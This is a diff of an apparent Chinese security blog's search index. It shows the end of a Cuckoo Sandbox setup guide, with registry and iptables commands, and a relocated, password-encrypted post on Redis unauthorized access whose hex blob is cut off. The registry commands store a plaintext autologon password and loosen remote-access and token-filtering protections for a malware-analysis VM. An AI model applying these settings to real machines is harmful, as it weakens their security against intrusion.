+<p>在Windows 7中，以管理员权限打开管理命令提示符，输入以下命令以启用自动登录和远程RPC。<br><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultUserName /d &lt;USERNAME&gt; /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultPassword /d &lt;PASSWORD&gt; /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v AutoAdminLogon /d <span class="number">1</span> /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\system\CurrentControlSet\Control\TerminalServer&quot; /v AllowRemoteRPC /d <span class="number">0</span>x01 /t REG_DWORD /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /d <span class="number">0</span>x01 /t REG_DWORD /f</span><br></pre></td></tr></table></figure><br>前两条命令里的 \<USERNAME> 和 \<PASSWORD> 为自己的账户和密码。</PASSWORD></USERNAME></p>
+<p>找到之前安装的cuckoo路径下的agent/agent.py,并将其放到win7的启动目录下，<code>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>，把agent.py后缀改为agent.pyw，这样程序启动就不会有GUI窗口。</p>
+<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>很多恶意软件都需要访问网络才可以正常运行，因此需要配置windows主机上网，使用host主机开启流量转发、用 iptables 做地址转换（NAT）规则。</p>
+<p>临时开启ip转发功能方式，系统重启之后便失效：</p>
+<ul>
+<li>sudo sysctl -w net.ipv4.ip_forward=1</li>
+<li>sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward</li>
+</ul>
+<p>若要重启后仍然有效，则需修改配置文件/etc/sysctl.conf，去掉net.ipv4.ip_forward=1 前的注释，之后执行如下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br></pre></td></tr></table></figure><br>然后配置Iptables的规则:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo iptables -A FORWARD -o eth0 -i vboxnet0 -s 192.168.56.0&#x2F;24 -m conntrack --ctstate NEW -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">sudo iptables -A POSTROUTING -t nat -j MASQUERADE</span><br><span class="line"></span><br><span class="line">sudo vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line">编辑 Ubuntu 的网络配置文件 &#x2F;etc&#x2F;network&#x2F;interfaces ，在文件末尾添加以下两行：</span><br><span class="line">pre-up iptables-restore &lt; &#x2F;etc&#x2F;iptables.rules #开机时启用 iptables 规则</span><br><span class="line">post-down iptables-save &gt; &#x2F;etc&#x2F;iptables.rules #关机前保存当前所有的 iptables 规则</span><br></pre></td></tr></table></figure><br>效果如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/ping.PNG" alt></p>
+]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>Cickoo Sandbox</tag>
       </tags>
   </entry>
   <entry>
@@ -748,6 +748,25 @@
       </tags>
   </entry>
   <entry>
+    <title>Redis未授权访问</title>
+    <url>/2019/02/27/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章。</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="b3c035b7908c260d0926068e7a07d4072beec8fc31bf6069c5b89945e3a4a5b7">a64cb9860c8fa1746a97fb3c864728093dad6865c2b9b7b132da05f338a6cfbecfafb9bf81683154e5614adab4d63419a874464641d32f2656d0eac55f74f2f2186ecfde30a86f2d310c0d3fc6b972f883b67d08bfede67d3013d3f9d64ca658435324715e336b44d9e50e5da2056190388da5810711d9c187047ea405bafc70197d847cc5dd41737e4489ac03e2989f04050412d3396a98a2b797ee40c7902250802bc075b2def413b1f807e6dc30a8a2965e48da7ea7c26f414131bf210d2e5f00d83fdf24a61a32cdb20ec78859d1805dfddbbc6aef4e6f4d0cc9d727d726409c11cb7d44c94508d47b60a52ac48a3469fd0e81d8d3bf414c08f836e1172f992a45fe6b47084c382ca88f8d403d7a5ee88036bc4130fd49167e3c7d303d5fcd8ca8032633d5e285a1f78d22a3ad08b7c85b2208d67d4b6bc90798b0cf6ad7f4107500d061327bb1c85fa28e8acadf78ba2d4016f36e2d37388cd46b6db435ac74cc76a4ede9ebcd821a0463d4bdc7af40a679d2c0067da24869142c61521fb8a7b2e9d7b208454d55b3f945299b36c08426596425fdd052fd3d5ca89f39602715be0b7a516001a7d461d93449841cf7cc3c556e385e1cc458d3be820449a876f7c3d46af584ebf677399190812898e807770e972a82ae261b49b63e1befb5e1fa8979becbf36f24efe0adc8a14bc0e9ba710baeb4521a0d0c24d61a0c1fdcee29cfd6c45049ebfe5f4197f95df327e3826b127dad42fc292fdbc0b6d5c3ceb1f1972897b9b0bed86d6a2a5b15d73ad2747a72bddf3b49cba22e440e7c048ac8ef5d095127ddd860f511a67e2dd7b11961c499e36ad8aae6a967ba532869ff05301a4d9b417e84e09123c34536dbc87112ac45b3123f3af6ea0b620affa34ab6aa7c4e77704925469e85c780fbb92248659c70c812deed76db5ff23c01ef7a791bbea9e4e6df22b91bc041cfb969df4c93d59d53d5621cd12687b7258e62a8ef5a6337c28e2397f6528a85a0b934dd9c1ea8fec5fa524083021c898646c07b468a3e00bb168f1332075b3e131e91f52e2dd13b8c69f92a644131ae0040d0d76bc403b6664c3216a61f094093f255e7193b6621d7c613ccbdb973c6e53ce5f810b8a01cd071c8170f3502bddd8536606eb2101b424485c045fac13366927bd3979e49647e46da157465de0f93a8e16a74135c99b371bfb30b4ba2aa888f3368bf21f13bb82bf86e5c8b2f219d982186f89a0515eb8813e63167fdcc57f19d6dc8a37ec9e0591e0bf9381a8e4430905104f9782eeddc069f899676c27e02cc87d1c20e3a6deec50d80ef9c470152eae79f361887a031b3cd4101defbdbfa964d7e695151892a151f2a675a1e0562cc6185eb8b1ee65cf7df9e4c24f65dfb7971ce20490ee92336e3c6053ec3b3c9d2fa63a44ad02962157251290054ef31b6c77d582f4090ab93fab52e6881e85636b82d0eeb7671f9b85d93334c5e8bc6b10f781217c034bff8adaa8cd7993b4d66672ff3b5e5fafc0af79c4a0c4c1d8ba32a5e04cae0968965b70610d16c26c2de7c7758b548153411bf85e385a286cb4e49eb2f35c9bc32c823c66059130990d2d042af460845d2980f5ea05dae9a0da5e416b4f2c081e16b74a27f3fe51b39976bade1d73077c61eb930ada4d00fb12500642ebe244ae444510b71eb63af395318d4ca0d0b6de95fc371fc3018bd13b740dd888b9de841565f65fe80b819efd3fa7e9174f26494d0a46031b7ec7b14c62017dbde93bc6ee9b3b9a3e09dc87f1aa51bd43c4d8b8d342c704c3eab55bef5b744b9cf7340faf8c062945991c08b0038ee22bf8744d3d5ff0fba62fca5eda0b0b4a23d5c9d864f1f9d6bf806a8636021a39a6af093516184ad16a29489bf5fe1f02cc5fa6db41f4502462b4a6e744823ac7e1ce0397c1c7dcce32ac7fa2279c5dbdefb2e8260483e701f92e62b7e1a321fff1172359fc2e192d928270f2ccdf87c757140e4c2c95e1aaac67c9e962748b5239055737556e36ca9f21f7a2f485b40a276192011b1e396705ebaad9bcedd46e32978813610f10ba4c5a38d69a092b8cb88ecb27efeb390de49b90365e4a5598fd3b75bbbf5a92805b55fe70a0b9874ccd0b84371f0d8c5d434dc5d82fbe42a0759cef1929542473950608016eba9072ffb48c4982eeaeba895b8904d3926053653656a15aab7aef4260b72c751ed930b077d8a1e40db9a6a988a6ceac9d91634059af6b1d50f52691fd1fb4ec78007550bcca2bb8f562dcd6a7ad90ad3e2401ef6067a40a72f26d7ca86a3b5160139521f66a52164e47a62760b82a753a0c6ad5a2e7803fbd85f9d99b23b31f64fc5f56b554177616362774b1dd77efdef17b5540cad28091958584bdc9f38eb3835e707945bcd79e6c6be5d3a553d42f9c5b30253a80d21897c850e7e67bc6a4813bf6e4d66aa907b61da412347f78592df1728f45b8bc82eab5200d6115c134c7c1119017b45c67a8b8c8d299305ee6b6418dafc7ffcf6206ec0b8397702a62d7447ed8495faff0744d0e718823a7361405935abc79eff61329cc15fbace6b21380e9e8f15c89b5ec4030beb2604d1b8eee9c5d1972f1e9c8001dc558174f6a75dbfd4b86091b76ef4de178c1daaedf1ed9852ecb94eb8b89d06f675125e015043f24ebe470c33ea3fbaeb8309821375f85676bd2249db7890f3c42380a5d36a29a547767d8a05522245474386c8142c71183a4e11d4d0e7efafbbe3645b4badc21155d839829e207e8c242c6e903891779f3ff489a4dbf8ed945f503a8f05d388b4901c31dbccdc5ddf8fbc122dea25ff2166df4b37031ca0b9d02f0a084910f821fb8a3ebe7d1d8e6986673242ac58207d0c0288e17e422bba2a3ba7609bb5e9490be74eab032ea96bd89231a0ca0d219e45f23325f4cf97fe634a7711c24414140f1fb04320d57cdf780d09ef46ae6abf31f090c2f33238c0bdcb8909773cae187d118991f9420a05a522a001bbcdbf8f42d9f48868cb5931a9c55ca540bea58d248c1f63a0c3fd504229b85f46d0c5dedabe58ddfcb789d8a376aa8b9cbd1c5613ae7fe5420b3af0b678bd3c908133aee8c5c180eccd1213144fdb15e27f06265816f0974f8d21094acb2c8635e80fd7aa0d01682105ee6f2c30570e8ab299842b3b86b76e2107c8ebf451ccdd96f5c28e366c8a8cfc1877ace4f83f6644a4c820798c995e0e0329c0e8f792dec5cd573b3d109e38a1c1aaaf7150fab5ba664fcbc53b1a9026a6e74be4080ec18e7a9a73a4229c80531acec16a62349524a9bfd87932e33720f365f326eb9d17db14bfc30301f171321a57b5fdb551d6f1157ac5fae166fa3d97086917ede2a292818b636afe9b47f02666f8b34f3f89b3b63e510896c2405bf278c01050a5b43e9e3859dfe12523ce9d2e8bbedc7d72742be58a701842894b23b2e70e56641ff821a36dd39052894ed9d1f09bcf1fa06f1316762b9653c2fd3b11bfa8d5571c10bccf818d1e54a61aefe680e83f8a41389b10fd0ac3c0eae3b80b6c3d9fe35e336625bb1964bd3a9cfe6337ec8a2488771da98f26ee589655ed10fa5f29d0e0fb17af289b34c4a6df245c4265271c2f87c6b7eec9de94de8141334edef4c295428e880e3e61178d5c287f2eff7c6c98e79b1f938745bda8f1ba20d92cff6321ff9a2492204b32b09acc7a0f22c668f1b12e4ea476a77ff55a87230be89d7d81cb811de848711e4fdf15cd7167df28349ea435472c7e4c97e251e5a388366a73ed4da2f67750d35b3319d65691657c8360ebb6a3ebd0022e2b344e9f90b26d68201584feb36e47e6d1f6f5d3f1ac43a1df92a79c8139acc6d702f78480cf919e400a83ad716dc371c0a6415f69031ac275561543df2f78db2379b844090eda8f567b2c4d6591fa00535beecfe56e3a0e2651ecc200c924a753ab8ff3f8eab9ed6157d9c22186e857227192b1edec046bd88516c91cb2e37e4ed7c18c8c7a47814216bfa95fd90ef77e941b2dd25c94ab519874831fe1ced1bf290cbd1ab9dd0791cce6f28f6503d647e9b632ffd6a4c6120eb4bad4cc647849d8550b5de6afe236faf86ef2c02a94feb7d90872ad339602b0c2858e7fe9bffdc35c66e3e4e12f46a2219221aed67df4b577eb8b3b8d24c9e995bd8d5933fc5de2acc48da2b82d9b5090b4822db1d3b6c473dfc5f810482a1e02eb004531816e86c94d730b01abacfccd427613006214ab4ed474bfb5b6171855b7d0c89001f23350b3006c5636bb9e8e30d18588084f736d354f2e207d6d6aca04108f8011e300d3f72974994864739b4683851b9e447a1592f9885ad8433558f9685d31de6a3522a481507d6b048c91bc52690215eb1ab63be3c2385137a974f591430064c8f53de08e791cb0c5499db75ea64a117acda54d481967668e17f53e5645d53ed96b6db149f58d8431be3b5ba7fb8fa3fd2532fbfe5c2a71f93e22407d9654917d5f4e25ea8fca2ff4ed562eb7838f663cab36aab55c01a6b1e379c62a411ea3e9b934f4d51fb6c039483e5e4ed3624440fec8369b8f1238b65bb7c6b258e23b31953c362fe95377921c1a56ff8d556eb66a0f1ce094e54d9d8f624785e62a18fe3e77bd104e875c31da8acf39b6713b3f34886e03cdfa33bdfc96c02be5dd310ce69b59481415c2b3afff22b8467b40e73bf2fc67ef81d83e08db8ba334eb9b73c86fd57e62f35df6ee07b5f678d6c7a122b9f480b704846ce6581b85efe954811ff810b6dba5786df13af6d6a8f327f43808541056c395b3f2fab53900d60decd12268e84e125ea144aac4cfcb9682bb15b5f73ffb3548dba7f3daa8fda5b9bbffe72b48c4b7135060ca8329defc88e118fce22d547b2c648862d840bea34c2c2b83cf59da29d0f10cfb144036b94ce34e53c5d301bdd5d75c8a9782d5a37bcc0157454eb2be2498b603da6530d6c364e909b1a77017e0288d7bb6366da2852689bf1705180422366778a1cf5f3e2e46cbd5b3c576152bc6effe924042bbbcc37efb373a6d293eab8d2d49af640a9dab880a3bed325e12e976c9d13b9204a45e4cc3ddc740a0e8eeaab5f82ae9abb13d9226c2895222087fd1ab2b93afa80fedeedeb3e322b743681a90a42e7d70d51628db9431289797aa6f2c0d4c7849ddd063f18153f4a37c5fc2b81f3fa9aca71a79fe1e073cdf95ab4f8df8e3bb0b8c7ce83e6a6970dc415a86730336ffc8e5da06d3580c951e0de64b18f58994b9a4827b12348db1ce6572580a11a884a61fc60c19508ad898a6edbcbfce55fdab0ec956acd4f7015d9fc05fe12ac1fa542d7becb386ded5908268b4bbb9d2ca1e20a85039eb0f68e4c0730f3ae066a8e004a645c31e6d389e7b6d16e8335807d414208d1e74bdc4a3628ce3200295bed1e87fbea34266336a96c3a1c7902a8814a5b41f6d89d3bb9529c92c6b5e07cd419a3731cc9afdcdcc05d22e1548b5affa7a331e8b3e992e5a7159720c7a70ecbf4068bad6b1301dba0002ea4f744caf8a3151dfdf8f4e3ff2b1e616c556bb8f5ea94ad3eac72a037cf436014294053fdfd8d28b70d499a1f8e4f8da267c563f5b4688ef3aa849497f513bed02e7cd67938d1ee3a8c9523a1f5b5257fcea017b02ddb5f685a9469e416703e6034d356e756a26f74ae618c4ea17250917c305900c37e5cf130bd1fa429395009232ae96f6527f5970867a327a14d8efd78a225ed22c0c82e32fe1941c71e6f9d0c26e927255b7f9c47865bf385212e2946af6f27b3c3c09e9414d45ce08eb59d6b6dfb2f63a4132725ec032703221716f0de4a12e41fdf52194ed4a09d9ce2ba3711e954513abcc0bc54133793414c5d98200d382c61b15a0e9ec67afd393539333c08c34eb66198723e552fdafdbc6d57161e1c5254252df4346ff56e5de739a9fab550253a8f0e4167b90f2cd888336249b8a9ad6d3d6f056034d4564136236ca5dfb8987150a2a8eb04b0c37bfcdcbe03c59028730ca009e5b2c1dd40d099357ae3cd9e10834ebe65086f855b577c5e25f314312832d993d060852c2fcff9ce542097aae63482d9da36e4210ea0ade4e3cfa12fa98ac55b5fee08aabc2e2874b8e79217a2f3183cd169538f98deb96912d1f718872045d38fb247ba45c39eddc1d2fee0d82cd852b4dc9ea996de918c62b1119274d79be45a851e3b7ba32681f152548fd907b5675ad1f84f86aba102bdb275fcfdaa0752ef000a0515edf60ff17730491d64b83ae9029b58bb7957954c54b819ca5605cc17e09c0f16d28db268d854b361848359b8c735bfc8f2fd43c5ca7b27154f94ae35139c3cf8e2c2381fa37e68f831e4e2d35ff356fe3c30d5862861ac7a2e553474899a01407f56f891cd6f82671f79f16190f6df65d0800b288406fbeac2a3572bf0b1494d7005a41857456ede17f7d836f481f1a00a5e729c2c62977318e7735f74cd4496e51fa804f807ad43b419991d05fbfe96aa7ef8e78a9f7f40521670ceee6bc24f1f5fa219dd2be6e6b4c6e4f9505a4859a0f4b53a0b3fe04173453b640a29e1eadf503a21e8ae89ba0216c5c46464757961fefe423e03cca1d3853282af8386607f924e3b70b5b636606ebea1aaa0857b3f72c5127bab71028e012271a3188c81bf24f01462033e2619c9d712ed81d6960fcd2248ad7599aa627cab1ab46b46944aaadc56903b1b939bdaeb4617589893306f74558de90468bb3d3abb956f31403fd3339e457f078a38f6c67adff197c416af38954bdf575f8afe0064e0d2cd906829fe0ce7c322836845ff483d231bdb9756455d680760bcacab82c211b93d8a0367e096bdbf1a719468f096336f21c175b33e73c4501b543ec29efc457ed2bc4eb6fc1e9d5a24eb0b4333f1104afb6ae05c21cbce3b1dbe778bf23bf3005cec4e81dc08594398be108ac6c4d3e44f96eec8352a7efcd29835abe7e8eddff7edecfce12dd8a79a2deb6903386cbe2329416314e076f00d5c415c76053c14938adb85c1f69d19b986bb6321996f05acc053a784bb1f5875c99d389c0cbad16dbc84fd3cd38b50bb1a42848849401bca096cd59597b446209cd622bbde61eb34138787ca12f048368b6284736a52332eb875edd602ae957ca67082c24f161879c7815db72beaf692bf85c694bd51a167802222b1f96ed576fe4f014bf68812221fba65b3082f68d4956e5c7d74ac207fc967a0eb7784bbd703498296256e4249935f3e1d50e0e7970dcba48b3c912d33e7012ff3ec9aa1525b883542fb676b22ca24a814beb43efadb871cb2e7714d769b2b4c50ab9e1839117f17275b72f2485aff4bff21dc505b75a4d488e0fe43d229356565fe7acc47397e97ce89382ccc5f6947b0e15f66e30e5f55c886ce6d5d8baa7dcbbe1d5cfcd0096d532d3e14cdaf7d2ba8afafbc05635bdfc24eb9eb363ae4012121db9b8fc89fedaf70c912e6762215b6c6004e70d667ebf02671951e3f416baabbace75ddde422ccef1e652bafb22526eaac0089c96fe3af51f16e789d796257e7008387653f7b4df2bb2204b212cd9f7703081e9ddff6719d552ce6794480650918d39b08c599d97b989b282c076f102515605ffda0a044fab35f68eca074eaa960ba59feb1c6fb2fd8ad80c271d5b2d3c87562227df4aa96ae962ff2386b4747799921483ef8f84c9dcd3f87d</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Redis</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NSA逆向工具--Ghidra安装及漏洞修复</title>
     <url>/2019/03/07/NSA%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-Ghidra%E5%AE%89%E8%A3%85%E5%8F%8A%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/</url>
     <content><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>2019年RSA安全大会上，美国国家安全局（NSA）公布了一款名叫Ghidra的逆向工程工具。Ghidra使用Java编写，具有图形界面，可在Windows，Mac和Linux上运行。</p>
@@ -779,25 +798,6 @@
       </categories>
       <tags>
         <tag>逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Redis未授权访问</title>
-    <url>/2019/02/27/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章。</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="b3c035b7908c260d0926068e7a07d4072beec8fc31bf6069c5b89945e3a4a5b7">a64cb9860c8fa1746a97fb3c864728093dad6865c2b9b7b132da05f338a6cfbecfafb9bf81683154e5614adab4d63419a874464641d32f2656d0eac55f74f2f2186ecfde30a86f2d310c0d3fc6b972f883b67d08bfede67d3013d3f9d64ca658435324715e336b44d9e50e5da2056190388da5810711d9c187047ea405bafc70197d847cc5dd41737e4489ac03e2989f04050412d3396a98a2b797ee40c7902250802bc075b2def413b1f807e6dc30a8a2965e48da7ea7c26f414131bf210d2e5f00d83fdf24a61a32cdb20ec78859d1805dfddbbc6aef4e6f4d0cc9d727d726409c11cb7d44c94508d47b60a52ac48a3469fd0e81d8d3bf414c08f836e1172f992a45fe6b47084c382ca88f8d403d7a5ee88036bc4130fd49167e3c7d303d5fcd8ca8032633d5e285a1f78d22a3ad08b7c85b2208d67d4b6bc90798b0cf6ad7f4107500d061327bb1c85fa28e8acadf78ba2d4016f36e2d37388cd46b6db435ac74cc76a4ede9ebcd821a0463d4bdc7af40a679d2c0067da24869142c61521fb8a7b2e9d7b208454d55b3f945299b36c08426596425fdd052fd3d5ca89f39602715be0b7a516001a7d461d93449841cf7cc3c556e385e1cc458d3be820449a876f7c3d46af584ebf677399190812898e807770e972a82ae261b49b63e1befb5e1fa8979becbf36f24efe0adc8a14bc0e9ba710baeb4521a0d0c24d61a0c1fdcee29cfd6c45049ebfe5f4197f95df327e3826b127dad42fc292fdbc0b6d5c3ceb1f1972897b9b0bed86d6a2a5b15d73ad2747a72bddf3b49cba22e440e7c048ac8ef5d095127ddd860f511a67e2dd7b11961c499e36ad8aae6a967ba532869ff05301a4d9b417e84e09123c34536dbc87112ac45b3123f3af6ea0b620affa34ab6aa7c4e77704925469e85c780fbb92248659c70c812deed76db5ff23c01ef7a791bbea9e4e6df22b91bc041cfb969df4c93d59d53d5621cd12687b7258e62a8ef5a6337c28e2397f6528a85a0b934dd9c1ea8fec5fa524083021c898646c07b468a3e00bb168f1332075b3e131e91f52e2dd13b8c69f92a644131ae0040d0d76bc403b6664c3216a61f094093f255e7193b6621d7c613ccbdb973c6e53ce5f810b8a01cd071c8170f3502bddd8536606eb2101b424485c045fac13366927bd3979e49647e46da157465de0f93a8e16a74135c99b371bfb30b4ba2aa888f3368bf21f13bb82bf86e5c8b2f219d982186f89a0515eb8813e63167fdcc57f19d6dc8a37ec9e0591e0bf9381a8e4430905104f9782eeddc069f899676c27e02cc87d1c20e3a6deec50d80ef9c470152eae79f361887a031b3cd4101defbdbfa964d7e695151892a151f2a675a1e0562cc6185eb8b1ee65cf7df9e4c24f65dfb7971ce20490ee92336e3c6053ec3b3c9d2fa63a44ad02962157251290054ef31b6c77d582f4090ab93fab52e6881e85636b82d0eeb7671f9b85d93334c5e8bc6b10f781217c034bff8adaa8cd7993b4d66672ff3b5e5fafc0af79c4a0c4c1d8ba32a5e04cae0968965b70610d16c26c2de7c7758b548153411bf85e385a286cb4e49eb2f35c9bc32c823c66059130990d2d042af460845d2980f5ea05dae9a0da5e416b4f2c081e16b74a27f3fe51b39976bade1d73077c61eb930ada4d00fb12500642ebe244ae444510b71eb63af395318d4ca0d0b6de95fc371fc3018bd13b740dd888b9de841565f65fe80b819efd3fa7e9174f26494d0a46031b7ec7b14c62017dbde93bc6ee9b3b9a3e09dc87f1aa51bd43c4d8b8d342c704c3eab55bef5b744b9cf7340faf8c062945991c08b0038ee22bf8744d3d5ff0fba62fca5eda0b0b4a23d5c9d864f1f9d6bf806a8636021a39a6af093516184ad16a29489bf5fe1f02cc5fa6db41f4502462b4a6e744823ac7e1ce0397c1c7dcce32ac7fa2279c5dbdefb2e8260483e701f92e62b7e1a321fff1172359fc2e192d928270f2ccdf87c757140e4c2c95e1aaac67c9e962748b5239055737556e36ca9f21f7a2f485b40a276192011b1e396705ebaad9bcedd46e32978813610f10ba4c5a38d69a092b8cb88ecb27efeb390de49b90365e4a5598fd3b75bbbf5a92805b55fe70a0b9874ccd0b84371f0d8c5d434dc5d82fbe42a0759cef1929542473950608016eba9072ffb48c4982eeaeba895b8904d3926053653656a15aab7aef4260b72c751ed930b077d8a1e40db9a6a988a6ceac9d91634059af6b1d50f52691fd1fb4ec78007550bcca2bb8f562dcd6a7ad90ad3e2401ef6067a40a72f26d7ca86a3b5160139521f66a52164e47a62760b82a753a0c6ad5a2e7803fbd85f9d99b23b31f64fc5f56b554177616362774b1dd77efdef17b5540cad28091958584bdc9f38eb3835e707945bcd79e6c6be5d3a553d42f9c5b30253a80d21897c850e7e67bc6a4813bf6e4d66aa907b61da412347f78592df1728f45b8bc82eab5200d6115c134c7c1119017b45c67a8b8c8d299305ee6b6418dafc7ffcf6206ec0b8397702a62d7447ed8495faff0744d0e718823a7361405935abc79eff61329cc15fbace6b21380e9e8f15c89b5ec4030beb2604d1b8eee9c5d1972f1e9c8001dc558174f6a75dbfd4b86091b76ef4de178c1daaedf1ed9852ecb94eb8b89d06f675125e015043f24ebe470c33ea3fbaeb8309821375f85676bd2249db7890f3c42380a5d36a29a547767d8a05522245474386c8142c71183a4e11d4d0e7efafbbe3645b4badc21155d839829e207e8c242c6e903891779f3ff489a4dbf8ed945f503a8f05d388b4901c31dbccdc5ddf8fbc122dea25ff2166df4b37031ca0b9d02f0a084910f821fb8a3ebe7d1d8e6986673242ac58207d0c0288e17e422bba2a3ba7609bb5e9490be74eab032ea96bd89231a0ca0d219e45f23325f4cf97fe634a7711c24414140f1fb04320d57cdf780d09ef46ae6abf31f090c2f33238c0bdcb8909773cae187d118991f9420a05a522a001bbcdbf8f42d9f48868cb5931a9c55ca540bea58d248c1f63a0c3fd504229b85f46d0c5dedabe58ddfcb789d8a376aa8b9cbd1c5613ae7fe5420b3af0b678bd3c908133aee8c5c180eccd1213144fdb15e27f06265816f0974f8d21094acb2c8635e80fd7aa0d01682105ee6f2c30570e8ab299842b3b86b76e2107c8ebf451ccdd96f5c28e366c8a8cfc1877ace4f83f6644a4c820798c995e0e0329c0e8f792dec5cd573b3d109e38a1c1aaaf7150fab5ba664fcbc53b1a9026a6e74be4080ec18e7a9a73a4229c80531acec16a62349524a9bfd87932e33720f365f326eb9d17db14bfc30301f171321a57b5fdb551d6f1157ac5fae166fa3d97086917ede2a292818b636afe9b47f02666f8b34f3f89b3b63e510896c2405bf278c01050a5b43e9e3859dfe12523ce9d2e8bbedc7d72742be58a701842894b23b2e70e56641ff821a36dd39052894ed9d1f09bcf1fa06f1316762b9653c2fd3b11bfa8d5571c10bccf818d1e54a61aefe680e83f8a41389b10fd0ac3c0eae3b80b6c3d9fe35e336625bb1964bd3a9cfe6337ec8a2488771da98f26ee589655ed10fa5f29d0e0fb17af289b34c4a6df245c4265271c2f87c6b7eec9de94de8141334edef4c295428e880e3e61178d5c287f2eff7c6c98e79b1f938745bda8f1ba20d92cff6321ff9a2492204b32b09acc7a0f22c668f1b12e4ea476a77ff55a87230be89d7d81cb811de848711e4fdf15cd7167df28349ea435472c7e4c97e251e5a388366a73ed4da2f67750d35b3319d65691657c8360ebb6a3ebd0022e2b344e9f90b26d68201584feb36e47e6d1f6f5d3f1ac43a1df92a79c8139acc6d702f78480cf919e400a83ad716dc371c0a6415f69031ac275561543df2f78db2379b844090eda8f567b2c4d6591fa00535beecfe56e3a0e2651ecc200c924a753ab8ff3f8eab9ed6157d9c22186e857227192b1edec046bd88516c91cb2e37e4ed7c18c8c7a47814216bfa95fd90ef77e941b2dd25c94ab519874831fe1ced1bf290cbd1ab9dd0791cce6f28f6503d647e9b632ffd6a4c6120eb4bad4cc647849d8550b5de6afe236faf86ef2c02a94feb7d90872ad339602b0c2858e7fe9bffdc35c66e3e4e12f46a2219221aed67df4b577eb8b3b8d24c9e995bd8d5933fc5de2acc48da2b82d9b5090b4822db1d3b6c473dfc5f810482a1e02eb004531816e86c94d730b01abacfccd427613006214ab4ed474bfb5b6171855b7d0c89001f23350b3006c5636bb9e8e30d18588084f736d354f2e207d6d6aca04108f8011e300d3f72974994864739b4683851b9e447a1592f9885ad8433558f9685d31de6a3522a481507d6b048c91bc52690215eb1ab63be3c2385137a974f591430064c8f53de08e791cb0c5499db75ea64a117acda54d481967668e17f53e5645d53ed96b6db149f58d8431be3b5ba7fb8fa3fd2532fbfe5c2a71f93e22407d9654917d5f4e25ea8fca2ff4ed562eb7838f663cab36aab55c01a6b1e379c62a411ea3e9b934f4d51fb6c039483e5e4ed3624440fec8369b8f1238b65bb7c6b258e23b31953c362fe95377921c1a56ff8d556eb66a0f1ce094e54d9d8f624785e62a18fe3e77bd104e875c31da8acf39b6713b3f34886e03cdfa33bdfc96c02be5dd310ce69b59481415c2b3afff22b8467b40e73bf2fc67ef81d83e08db8ba334eb9b73c86fd57e62f35df6ee07b5f678d6c7a122b9f480b704846ce6581b85efe954811ff810b6dba5786df13af6d6a8f327f43808541056c395b3f2fab53900d60decd12268e84e125ea144aac4cfcb9682bb15b5f73ffb3548dba7f3daa8fda5b9bbffe72b48c4b7135060ca8329defc88e118fce22d547b2c648862d840bea34c2c2b83cf59da29d0f10cfb144036b94ce34e53c5d301bdd5d75c8a9782d5a37bcc0157454eb2be2498b603da6530d6c364e909b1a77017e0288d7bb6366da2852689bf1705180422366778a1cf5f3e2e46cbd5b3c576152bc6effe924042bbbcc37efb373a6d293eab8d2d49af640a9dab880a3bed325e12e976c9d13b9204a45e4cc3ddc740a0e8eeaab5f82ae9abb13d9226c2895222087fd1ab2b93afa80fedeedeb3e322b743681a90a42e7d70d51628db9431289797aa6f2c0d4c7849ddd063f18153f4a37c5fc2b81f3fa9aca71a79fe1e073cdf95ab4f8df8e3bb0b8c7ce83e6a6970dc415a86730336ffc8e5da06d3580c951e0de64b18f58994b9a4827b12348db1ce6572580a11a884a61fc60c19508ad898a6edbcbfce55fdab0ec956acd4f7015d9fc05fe12ac1fa542d7becb386ded5908268b4bbb9d2ca1e20a85039eb0f68e4c0730f3ae066a8e004a645c31e6d389e7b6d16e8335807d414208d1e74bdc4a3628ce3200295bed1e87fbea34266336a96c3a1c7902a8814a5b41f6d89d3bb9529c9